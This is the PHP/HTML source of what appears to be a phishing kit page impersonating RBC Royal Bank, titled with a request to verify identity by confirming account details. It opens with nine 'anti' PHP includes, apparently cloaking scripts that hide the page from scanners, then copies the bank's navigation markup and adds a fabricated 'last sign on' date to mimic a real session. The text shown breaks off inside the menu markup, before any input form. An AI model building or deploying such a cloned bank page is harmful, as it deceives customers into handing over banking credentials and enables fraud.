<?php
	include '../../../../prevents/anti1.php';
	include '../../../../prevents/anti2.php';
	include '../../../../prevents/anti3.php';
	include '../../../../prevents/anti4.php';
	include '../../../../prevents/anti5.php';
	include '../../../../prevents/anti6.php';
	include '../../../../prevents/anti7.php';
	include '../../../../prevents/anti8.php';
	include '../../../../prevents/anti9.php';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Verify your indentity by confirming your Account Details</title>
<base  />
<!-- START Tag MGMT Code **DO NOT REMOVE** -->
<script type="text/javascript" src="../../../nexus.ensighten.com/rbc/Bootstrap.js"></script>
<!-- END Tag MGMT Code**DO NOT REMOVE** --> 

<meta name="PI-tag" content="/cards/inquiry/technical-faq.html"> 
<meta name="PI-qtag" content=""> 

<link rel="icon" href="http://www.rbcroyalbank.com/uos/_assets/images/icons/favicon.ico" type="image/x-icon" />
<link rel="shortcut icon" href="http://www.rbcroyalbank.com/uos/_assets/images/icons/favicon.ico" />
<link rel="stylesheet" type="text/css" href="../../uos/_assets/css/common.css" />
<link rel="stylesheet" type="text/css" href="../../uos/_assets/css/print.css" media="print" />
<link rel="alternate stylesheet" type="text/css" href="../../uos/_assets/css/textsize-large.css" media="screen" title="textsize-large" />
<link rel="alternate stylesheet" type="text/css" href="../../uos/_assets/css/textsize-extralarge.css" media="screen" title="textsize-extralarge" />
<script type="text/javascript" src="../../uos/_assets/js/utilities.js"></script>
<script src="../../uos/_assets/js/jquery/jquery.js" type="text/javascript"></script>
<script type="text/javascript" src="../../new-header-footer/search-ask.js"></script>
<link rel="stylesheet" type="text/css" href="../../new-header-footer/search-ask-style.css" media="screen" />

<link href="css/base1.css" rel="stylesheet" type="text/css" />

</head>
<body>
<a name="top" id="top"></a>
<div class="skipnav"><a href="technical-faq.html#skipheadernav">Skip Header Navigation</a></div>
<div id="wrapper">
  <div id="globalheader" class="clear" style="z-index: 1000;">
       	<div id="globalheader-logo"><a href="/"><img src="../../uos/_assets/images/logos/web/rbc_royalbank_en.gif" alt="RBC Royal Bank" width="145" height="47" border="0" /></a></div>
        <p id="globalheader-links"><a id="contact">Contact |</a><a id="communications"> Communications Centre |</a><a id="mange"> Manage My Accounts |</a><a id="sing"> 
		<span class="auto-style2">Sing out</span></a></p>        

<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
<div ng-app="myApp" ng-controller="datCtrl" class="admin-menu subcopy">
						
					Your last sign on:<a> <span class="auto-style1">{{ today | date }}</span></a> <a> <script type="text/javascript" language="JavaScript">dates_currentDate( 'ENGLISH' );</script>
            </a> |Activity on: <span class="auto-style1"> <a> {{ today | date }}</a>
            <script>
var app = angular.module('myApp', []);
app.controller('datCtrl', function($scope) {
    $scope.today = new Date();
});
</script>

					</span>

					</div>     
    </div>  <style>
.nodd a:hover {background: none !important;text-decoration: underline !important;}
.nodd a:visited, .nodd a:link {background: none !important;}
#hr1 {
	background-color: #0000CC;
	color: #0000CC;
	height: 1px;
}
.auto-style1 {
	color: #002888;
}
			.auto-style2 {
				color: #FF0000;
			}
			#cheque {
				position: relative;
			}
			#loading {
				text-align: center;
			}
			#please {
				text-align: center;
			}
			</style>
<div id="mainnav" style="z-index: 990;">
        <div id="mainnav-level1" class="clear">
            <ul>
<li class="mainnav-level1-rightofcurrentpage"><span><a>Products &amp; Services</a></span></li>
<li class="mainnav-level1-currentpage"><span><a>My Accounts</a></span></li>
<li><span><a>Customer Service</a></span></li>
<!--<li><span><a href="http://www.rbcroyalbank.com/insurance">Insurance</a></span></li>-->
            </ul>
        </div>
    </div>
<!-- **** **** MAIN MENU OVERLAY STARTS **** *** -->
<div class="mainnav-overylay-category-wpr" id="overlay-wpr">
<div class="mainnav-overlay-gradient">
<div id="menu-overlay-bottom"><img src="../../new-header-footer/main-menu-bottom.png" alt="" /></div>
<ul id="mainnavOverlay">


<!-- Accounts starts -->
<li>
<div class="mainnav-overlay-header">
	<h3>Bank Accounts</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbcroyalbank.com/products/deposits/index.html?topnavclick=true">Bank Accounts Home <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn">
		<h4 class="firstline">Research By Category</h4>
		<ul class="subcopy">
			<li><a href="http://www.rbcroyalbank.com/products/deposits/banking-accounts.html?topnavclick=true">Chequing Accounts</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/savings-accounts.html?topnavclick=true">Savings Accounts</a></li>
			<li><a href="http://www.rbcroyalbank.com/tfsa/index.html?topnavclick=true">Tax-Free Savings Accounts</a></li>
			<li><a href="http://www.rbcroyalbank.com/usbanking/index.html?topnavclick=true">US Banking Accounts</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Popular Accounts</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/products/deposits/signature-no-limit-banking.html?topnavclick=true">Signature No Limit Banking</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/e-savings.html?topnavclick=true">High Interest eSavings</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/student-banking-no-limit.html?topnavclick=true">No Limit Banking for Students</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/vip-banking.html?topnavclick=true">VIP Banking</a></li>
		</ul>
		<h4>Get a Recommendation</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcroyalbank.com/cgi-bin/account-selector/selector.cgi?topnavclick=true">Bank Account Selector</a></li>
			<li><a href="http://www.rbcroyalbank.com/usbanking/index.html?topnavclick=true">U.S. Account Selector</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/banking-compare.html?topnavclick=true">Compare Banking Accounts</a></li>
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Managing Your Account</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/online/index.html?topnavclick=true">RBC Online Banking</a></li>
			<li><a href="http://www.rbcroyalbank.com/mobile/index.html?topnavclick=true">Mobile Banking</a></li>
			<li><a href="https://maps.rbcroyalbank.com/?topnavclick=true">Branch &amp; ATM Locator</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/deposits/transfer-to-rbc.html?topnavclick=true">Switch to RBC</a></li>
		</ul>
		<h4>Bank Accounts For...</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/products/deposits/youth-student-banking.html?topnavclick=true">Youth &amp; Students</a></li>
			<!--<li><a href="http://www.rbc.com/canada/?topnavclick=true">Newcomers to Canada</a></li>-->
			<li><a href="http://www.rbc.com/newcomers/">Newcomers to Canada</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<!-- ***ACCOUNT SELECTOR STARTS*** -->
<div class="callout callout-lightblue-gradient">
<span class="callout-top"><span>&nbsp;</span></span>
<div class="callout-content clear">
<h2><img src="../../uos/_assets/images/icons/check-mark-large.gif" alt=""  class="callout-titleicon" />Account Selector</h2>
<p>Find an account that's right for you:</p>	
<form method="get" action="http://www.rbcroyalbank.com/account-selector/index.html">
	<table>
		<tbody>
		<tr>
			<td><strong>Your Age:</strong></td>
			<td colspan="2">
			<select name="age">
			<option id="under19_id" name="age" value="1" >Under 19</option>
			<option selected="selected" id="19to60_id" name="age" value="2">19-64</option>
			<option id="over60_id" name="age" value="3">65 and over</option>
			</select>
			</td>
				 	
		</tr>
		<tr>
			<td><strong>Full-time<br /> Student?</strong></td>
			<td><input id="full_time_yes_id" name="student" type="radio" value="yes" />
				<label for="full_time_yes">Yes</label></td>
			<td><input id="full_time_no_id" name="student" type="radio" value="no" checked />
				<label for="full_time_no">No</label></td>
		</tr>
		</tbody>
	</table>
			
	<!--<p class="clear"><span class="button button-secondary buttonfloatright"><span>
	<a class="linkedtextandicon rbc-toggle {targetelement: '.rbc-example-3'}" href="#">Continue <img src="/uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a>
	</span></span></p>-->
			
<p class="clear" style="margin-bottom: 5px;"><span class="button button-secondary buttonfloatright"><span>
<button type="submit">Go</button>
</span></span></p>
		
</form>					  			
</div>
<span class="callout-bottom"><span>&nbsp;</span></span>
</div>
<!-- ***ACCOUNT SELECTOR ENDS*** -->
	</div>
</div>

<div class="callout callout-taupe-gradient oneline-callout"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear">
	<p class="standardtextsize"><img src="../../uos/_assets/images/buttons/chevron.gif" alt="" border="0" class="bullet" /> <a href="http://www.rbcroyalbank.com/products/deposits/vip-banking.html"><strong>Open our best value all-inclusive banking package and get unlimited banking transactions at other bank ATMs<sup>3</sup></strong></a></p>
</div><span class="callout-bottom"><span>&nbsp;</span></span></div>
</li>
<!-- Accounts ends -->


<!-- Credit Cards starts -->
<li>
<div class="mainnav-overlay-header">
	<h3>Credit Cards</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbcroyalbank.com/credit-cards/index.html?topnavclick=true">Credit Cards Home <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn">
		<h4 class="firstline">Research By Category</h4>
		<ul class="subcopy">
			<li><a href="http://www.rbcroyalbank.com/credit-cards/travel-credit-cards/?topnavclick=true">Travel Credit Cards</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/rewards-credit-cards/?topnavclick=true">Rewards Credit Cards</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/cash-back-credit-cards/?topnavclick=true">Cash Back Credit Cards</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/all-credit-cards/#/low-interest">Low Interest Cards</a></li>
			<li><a href="http://www.rbcroyalbank.com/visagiftcard/?topnavclick=true">Prepaid Cards</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Popular Cards</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/credit-cards/rewards-credit-cards/rewards-plus.html?topnavclick=true">RBC Rewards+</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/cash-back-credit-cards/cash-back-mastercard/?topnavclick=true">Cash Back Mastercard</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/rewards-credit-cards/rewards-card.html?topnavclick=true">Signature RBC Rewards Visa</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/travel-credit-cards/infinite-avion.html?topnavclick=true">Visa Infinite Avion</a></li>
		</ul>
		<h4>Get a Recommendation</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/credit-cards/tools/credit-card-selector/?topnavclick=true">Credit Card Selector</a></li>
			<li><a href="http://www.rbcroyalbank.com/credit-cards/tools/compare-credit-cards/?c1=avion_inf&amp;topnavclick=true">Compare Credit Cards</a></li>
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Managing Your Card</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcrewards.com/?topnavclick=true">RBC Rewards</a></li>
			<li><a href="https://online.royalbank.com/cgi-bin/apply/occa/apply.cgi">Activate My Credit Card</a></li>
			<li><a href="https://www.rbcroyalbank.com/credit-cards/customer-service.html?tab=report-lost_tab&amp;topnavclick=true">Report a Lost or Stolen Card</a></li>
			<li><a href="https://www.rbcroyalbank.com/credit-cards/customer-service.html?topnavclick=true">Customer Service</a></li>
		</ul>
		<h4>Credit Cards For...</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/credit-cards/student-credit-cards/?topnavclick=true">Students</a></li>
			<!--<li><a href="http://www.rbc.com/canada/?topnavclick=true">Newcomers to Canada</a></li>-->
			<li><a href="http://www.rbc.com/newcomers/">Newcomers to Canada</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<h4 class="firstline">Need help choosing a card?</h4>
		<img src="../../new-header-footer/credit-cards-selector-inline.jpg" alt="Select Credit Card" />
		<p class="subcopy">Select the type of credit card that interest you:</p>
		<select id="choose_card_dd_id" name="dropdown" style="float:left; width:160px;">
			<option value="" selected="selected">Select...</option>
			<option value="personal">Personal Card</option>
			<option value="business">Business Card</option>
			<option value="student">Student Card</option>
		</select>
		<p id="choose_card_go_btn_id" class="button button-secondary buttonfloatright"><span><a href="javascript:void(0);">Go</a></span></p>
		<p id="choose_card_go_btn_disabled_id" class="button button-disabled buttonfloatright"><span>Go</span></p>
	</div>
</div>
</li>
<!-- Credit Cards ends -->


<!-- Mortgages starts -->
<li>
<div class="mainnav-overlay-header">
	<h3>Mortgages &amp; Home Equity</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbcroyalbank.com/mortgages/index.html?topnavclick=true">Mortgages Home <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn">
		<h4 class="firstline">Mortgage Solutions For...</h4>
		<ul class="subcopy">
			<li><a href="http://www.rbcroyalbank.com/mortgages/first_time_home_buyers.html?topnavclick=true">First Time Homebuyers</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/purchasing_your_next_home.html?topnavclick=true">Buying Your Next Home</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/renewing_your_mortgage.html?topnavclick=true">Renewing Your Mortgage</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/home_refinancing.html?topnavclick=true">Refinancing</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/transfer_to_rbc_today.html?topnavclick=true">Switching to RBC</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/self-employed-mortgage.html?topnavclick=true">Self-Employed Mortgage</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/vacation-home-mortgage.html?topnavclick=true">Vacation Properties</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Mortgage Rates</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/mortgages/mortgage-rates.html?topnavclick=true">View Current Mortgage Rates</a></li>
		</ul>

		<h4>Mortgage Types</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/mortgages/fixed-rate-mortgage.html?topnavclick=true">Fixed Rate Mortgages</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/variable-rate-mortgage.html?topnavclick=true">Variable Rate Mortgages</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/cash-back-mortgage.html?topnavclick=true">Cash Back Mortgage</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/rbc-homeline-plan.html?topnavclick=true">RBC Homeline Plan</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/investment-property-mortgage.html?topnavclick=true">Investment Property Mortgage</a></li>	
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Managing Your Mortgage</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/mortgages/money_saving_options.html?topnavclick=true">Pay Down Your Mortgage Faster</a></li>
			<li><a href="http://www.rbcroyalbank.com/mortgages/skip_a_payment.html?topnavclick=true">Skip a Payment</a></li>
			<li><a href="https://www.rbcroyalbank.com/mortgages/customer_service.html?topnavclick=true">Customer Service</a></li>
		</ul>
		<h4>Tools &amp; Calculators</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/mortgages/mpcrds/start.html">Calculate Mortgage Payments</a></li>
			<li><a href="https://www.rbcroyalbank.com/cgi-bin/mortgage/tools/howmuch/afford.pl?topnavclick=true">How Much Can You Afford?</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<div style="text-align:center; width:216px; margin-left:auto; margin-right:auto;">
			<img id="lock-your-rate-rightnav" src="../../new-header-footer/mortgages-Lock_Your_Rate_216X150.jpg" usemap="#lock-your-rate-rightnav" border="0" width="216" height="150" alt="Lock your fixed mortgage rate for 120 days, guaranteed1" />
			<map id="_lock-your-rate-rightnav" name="lock-your-rate-rightnav">
				<area shape="rect" coords="172,67,191,88" href="http://www.rbcroyalbank.com/mortgages/_assets-custom/lock-your-rate.html" alt="" title="" onclick="return popupHelp(this.href)" title="(opens new window)" target="_blank"   />
				<area shape="rect" coords="8,118,146,139" href="https://mortgage.rbc.com/preapproval/index.asp?CTAtopnavclick=true" alt="Get Pre-Approved" title="Get Pre-Approved"  id="mtg-topnav-preapproval"  />
			</map>
		</div>
	</div>
</div>

<!--<div class="callout callout-taupe-gradient oneline-callout"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear">
	<p class="standardtextsize"><img src="/uos/_assets/images/buttons/chevron.gif" alt="" border="0" class="bullet" /> placeholder</p>
</div><span class="callout-bottom"><span>&nbsp;</span></span></div>-->
</li>
<!-- Mortgages ends -->


<!-- Lending starts -->
<li>
<div class="mainnav-overlay-header">
	<h3>Personal Loans</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbcroyalbank.com/personal-loans/index.html?topnavclick=true">Home <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn">
		<h4 class="firstline">Personal Loans For...</h4>
		<ul class="subcopy">
			<li><a href="http://www.rbcroyalbank.com/personal-loans/car-loans.html?buyingacartopnavclick=true">Buying a Car</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/home-improvement-loans.html?majorpurchasetopnavclick=true">Major Purchases</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/pay-down-debt.html">Consolidating Debt</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/home-improvement-loans.html?homerenovationstopnavclick=true">Home Renovations</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/rrsp-loans.html?borrowingtoinvesttopnavclick=true">Borrowing to Invest</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/student-line-of-credit.html?financinganeducationtopnavclick=true">Financing an Education</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Research By Category</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/personal-loans/personal-loans.html?topnavclick=true">Fixed & Variable Rate Loans</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/car-loans.html?carloanstopnavclick=true">Car Loans</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/energy-saver-loan.html?topnavclick=true">RBC Energy Saver Loan</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/rrsp-loans.html?rrsploanstopnavclick=true">RRSP Loans</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/line-of-credit.html?topnavclick=true">Lines of Credit</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/student-line-of-credit.html?studentloanstopnavclick=true">Student Loans</a></li>
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Use our Loan Calculators</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/cgi-bin/personalloans/payment/calc.cgi?topnavclick=true">Loan Payment Calculator</a></li>
			<li><a href="https://www.rbcroyalbank.com/cgi-bin/personalloans/pst/pst.pl?topnavclick=true">Credit Selector</a></li>
			<li><a href="http://www.rbcroyalbank.com/cgi-bin/personalloans/debt-consolidation/debt-consolidation-calculator.pl?topnavclick=true">Debt Consolidation Calculator</a>
			<li><a href="https://www.rbcroyalbank.com/cgi-bin/personalloans/debt-reduction/debt-reduction-plan.pl">Debt Reduction Plan</a>
			<!--<li><a href="https://www.rbcroyalbank.com/cgi-bin/personalloans/carloans/lh3.pl">Car Loan Calculator</a></li>-->
			<li><a href="https://www.rbcroyalbank.com/cgi-bin/personalloans/rrsp/rrsp-loan-calculator.cgi?topnavclick=true">RRSP Loan Calculator</a></li>
			<li><a href="http://www.rbcroyalbank.com/personal-loans/budget/budget-calculator.html?topnavclick=true">Create a Budget Calculator</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<h4 class="firstline">Apply for a Line of Credit or Loan</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/personal-loans/gateway.html">Apply for Loan Now</a></li>
			<li><a href="https://maps.rbcroyalbank.com/?_ga=2.127801934.2136017912.1511795792-1937626578.1509478245">Visit Us in Branch – Find a Branch</a></li>
			<li>Call to Talk to a Credit Specialist<br/>1-800-769-2511</li>
		</ul>
	</div>
</div>
<div class="callout callout-taupe-gradient oneline-callout"><span class="callout-top"><span>&nbsp;</span></span><div class="callout-content clear">
	<p class="standardtextsize"><img src="../../uos/_assets/images/buttons/chevron.gif" alt="" border="0" class="bullet" /> <a href="http://www.rbcroyalbank.com/personal-loans/car-loans.html"><strong>Buying a car? Let us help you get the most for your money</strong></a></p>
</div><span class="callout-bottom"><span>&nbsp;</span></span></div>
</li>
<!-- Lending ends -->


<!-- Investments starts -->
<li>
<div class="mainnav-overlay-header">
	<h3>Investments</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbcroyalbank.com/investing/index.html?topnavclick=true">Investments Home <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn-bullet">
		<h4 class="firstline">Advice for Investors...</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/investing/investment-advice/starting-out.html?topnavclick=true">Getting Started</a></li>
			<li><a href="http://www.rbcroyalbank.com/investing/investment-advice/building-wealth.html?topnavclick=true">Building Your Wealth</a></li>
			<li><a href="http://www.rbcroyalbank.com/investing/investment-advice/ready-to-retire/index.html?topnavclick=true">Getting Ready to Retire</a></li>
			<li><a href="http://www.rbcroyalbank.com/investing/investment-advice/living-in-retirement/index.html?topnavclick=true">Living in Retirement</a></li>
			<li><a href="http://www.rbcroyalbank.com/investing/investment-advice/regaining-confidence.html?topnavclick=true">Regaining Confidence</a></li>
		</ul>

		<h4>Investing &amp; Wealth Planning</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcfinancialplanning.com/?topnavclick=true">Financial Planning</a></li>
			<li><a href="http://www.rbcwealthmanagement.com/estateandtrust/index.html?topnavclick=true">Estate &amp; Trust Services</a></li>
			<li><a href="http://www.rbcwealthmanagement.com/canada.html?topnavclick=true">Wealth Management</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Types of Accounts</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/products/taxfreesavings/index.html?topnavclick=true">Tax Free Savings - TFSA</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/rrsp/index.html?topnavclick=true">Retirement Savings - RRSP</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/retirementincomefund/index.html?topnavclick=true">Retirement Income - RRIF</a></li>
			<li><a href="http://www.rbcroyalbank.com/resp/index.html?topnavclick=true">Education Savings - RESP</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/rdsp/index.html?topnavclick=true">Disability Savings - RDSP</a></li>
		</ul>
		<h4>Online Investing</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcdirectinvesting.com/?topnavclick=true">Self-Directed Investing</a></li>
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Investment Products<sup>+</sup></h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/products/gic/index.html?topnavclick=true">Guaranteed Investments - GICs</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/mutual-funds/index.html?topnavclick=true">Mutual Funds &amp; Portfolio Solutions</a></li>
			<li><a href="http://www.rbcroyalbank.com/products/savings-deposit/index.html?topnavclick=true">Savings Deposit</a></li>
			<li><a href="https://www.rbcdirectinvesting.com/investment-choices/stocks.html">Stocks</a> and <a href="https://www.rbcdirectinvesting.com/investment-choices/bonds.html">Bonds</a></li>
			<li><a href="https://www.rbcdirectinvesting.com/investment-choices/etfs.html">Exchange Traded Funds - ETFs</a></li>
		</ul>

		<h4>Tools &amp; Calculators</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="http://www.rbcroyalbank.com/products/rrsp/rsp-matic/launch.html?topnavclick=true" onclick="return popup(this.href,'',w=795,h=485)" title="(opens new window)" target="_blank" class="linkedtextandicon"><span>Maximize Your RRSP Savings</span> <img src="../../uos/_assets/images/icons/newwindow.gif" alt="(opens new window)" class="icon" /></a></li>
			<li><a href="http://www.rbcroyalbank.com/products/tfsa/intro.html?topnavclick=true" onclick="return popup(this.href,'',w=795,h=485)" title="(opens new window)" target="_blank" class="linkedtextandicon"><span>See how fast your money grows in a TFSA</span> <img src="../../uos/_assets/images/icons/newwindow.gif" alt="(opens new window)" class="icon" /></a></li>
			<li><a href="http://www.rbcroyalbank.com/products/gic/tools/select/index.html?topnavclick=true">Select &amp; Compare GICs</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<h4 class="firstline">Purchase Investments:</h4>
		<a href="http://www.rbcroyalbank.com/investing/purchase-investments.html?topnavclick=true" class="nohover"><img src="../../new-header-footer/investments-feature-img.jpg" alt="" /></a>
		<p class="subcopy">Three convenient ways to invest: online, by phone, or in branch.</p>
		<p style="margin-top:8px;"><span class="button button-secondary"><span><a href="http://www.rbcroyalbank.com/investing/purchase-investments.html?topnavclick=true">Get Started <img src="../../uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></span></p>
	</div>
</div>

<span class="subcopygray" style="line-height: 1.3em;"><sup>+</sup> Products and services may be offered by Royal Bank of Canada or by a separate corporate entity affiliated with Royal Bank of Canada, including but not limited to Royal Mutual Funds Inc., RBC Direct Investing Inc. (Member&ndash;Canadian Investor Protection Fund), RBC Global Asset Management Inc., Royal Trust Company or The Royal Trust Corporation of Canada</span>
</li>
<!-- Investments ends -->


<!-- Advice starts 
<li>
<div class="mainnav-overlay-header">
	<h3>RBC Advice Centre</h3>
	<p class="button button-secondary buttonfloatright"><span><a href="http://www.rbc.com/advice/advice-and-tools.html?topnavclick=true">RBC Advice Centre Home <img src="/uos/_assets/images/buttons/chevron.gif" alt="" width="12" height="12" /></a></span></p>
</div>

<div class="mainnav-overlay-content">
	<div class="firstcolumn-bullet">
		<h4 class="firstline">Everyday Banking</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/everyday_banking/budgeting_and_savings_solutions?topnavclick=true">Budgeting &amp; Savings Solutions</a></li>
			<li><a href="https://www.rbcadvicecentre.com/everyday_banking/credit_card_advice?topnavclick=true">Credit Card Advice</a></li>
			<li><a href="https://www.rbcadvicecentre.com/everyday_banking/everyday_banking?topnavclick=true">Everyday Banking</a></li>
		</ul>
		<h4>Home Ownership</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/home_ownership/buying_a_home?topnavclick=true">Buying a Home</a></li>
			<li><a href="https://www.rbcadvicecentre.com/home_ownership/managing_your_mortgage?topnavclick=true">Managing Your Mortgage</a></li>
			<li><a href="https://www.rbcadvicecentre.com/home_ownership/renovating_your_home?topnavclick=true">Renovating Your Home</a></li>
		</ul>
	</div>

	<div class="secondcolumn">
		<h4 class="firstline">Loans &amp; Credit</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/loans_and_credit/your_borrowing_options?topnavclick=true">Your Borrowing Options</a></li>
			<li><a href="https://www.rbcadvicecentre.com/loans_and_credit/understanding_credit?topnavclick=true">Understanding Credit</a></li>
			<li><a href="https://www.rbcadvicecentre.com/loans_and_credit/managing_and_reducing_debt?topnavclick=true">Managing and Reducing Debt</a></li>
		</ul>
		<h4>Savings &amp; Investing</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/saving_and_investing/managing_your_investments?topnavclick=true">Managing Your Investments</a></li>
			<li><a href="https://www.rbcadvicecentre.com/saving_and_investing/retirement_and_estate_planning?topnavclick=true">Retirement &amp; Estate Planning</a></li>
			<li><a href="https://www.rbcadvicecentre.com/saving_and_investing/the_fundamentals_of_saving_and_investing?topnavclick=true">The Fundamentals of Saving &amp; Investing</a></li>
		</ul>
	</div>

	<div class="thirdcolumn">
		<h4 class="firstline">Business Advice</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/business_advice/starting_a_business?topnavclick=true">Starting a Business</a></li>
			<li><a href="https://www.rbcadvicecentre.com/business_advice/managing_and_growing_your_business?topnavclick=true">Managing &amp; Growing Your Business</a></li>
			<li><a href="https://www.rbcadvicecentre.com/business_advice/succession_and_retirement_planning?topnavclick=true">Succession &amp; Retirement Planning</a></li>
		</ul>
		<h4>Key Life Moments</h4>
		<ul class="subcopy bullets-arrow">
			<li><a href="https://www.rbcadvicecentre.com/student-solution?topnavclick=true">Better Student Life</a></li>
			<li><a href="https://www.rbcadvicecentre.com/buying_your_first_home?topnavclick=true">Buying Your First Home</a></li>
			<li><a href="https://www.rbcadvicecentre.com/key_life_moments/starting_a_life_in_canada?topnavclick=true">Starting a Life in Canada</a></li>
			<li><a href="https://www.rbcadvicecentre.com/key_life_moments?topnavclick=true">more...</a></li>
		</ul>
	</div>

	<div class="fourthcolumn">
		<h4 class="firstline">How does a Student Line of Credit work?</h4>
		<a href="https://www.rbcadvicecentre.com/Student-Line-of-Credit-is-it-a-solution-for-you?topnavclick=true"><img src="/new-header-footer/advice-feature-video.jpg" alt="Watch Feature Video" /></a>
